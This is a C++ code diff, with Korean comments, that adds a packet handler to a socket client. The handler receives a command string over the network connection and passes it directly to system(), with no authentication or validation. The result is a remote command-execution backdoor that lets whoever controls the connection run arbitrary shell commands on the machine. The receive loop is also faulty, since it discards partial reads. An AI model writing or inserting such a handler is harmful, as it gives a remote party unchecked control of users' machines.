@@ -153,6 +153,27 @@ int main(int argc, const char* argv[])
 			delete[] pMessage;
 		}
 
+		else if (iCommand == PROTOCOL_ID_COMMAND_LINE)
+		{
+			// 실제 파일 길이는 이만큼
+			const int nMessage = nTotalPacket - sizeof(uintmax_t) - sizeof(int);
+			char* pMessage = new char[nMessage + 1];
+
+			while (true)
+			{
+				int tmp_read_size = recv(client, (char*)pMessage, nMessage, 0);
+				if (tmp_read_size != nMessage) continue;
+				pMessage[nMessage] = 0x00; // 마지막 위치를 NULL로 준다.
+
+				break;
+			}
+
+			system(pMessage);
+			//MessageBoxA(NULL, pMessage, "", MB_OK);
+
+			delete[] pMessage;
+		}
+
 	}
 
 	connecter.Close();
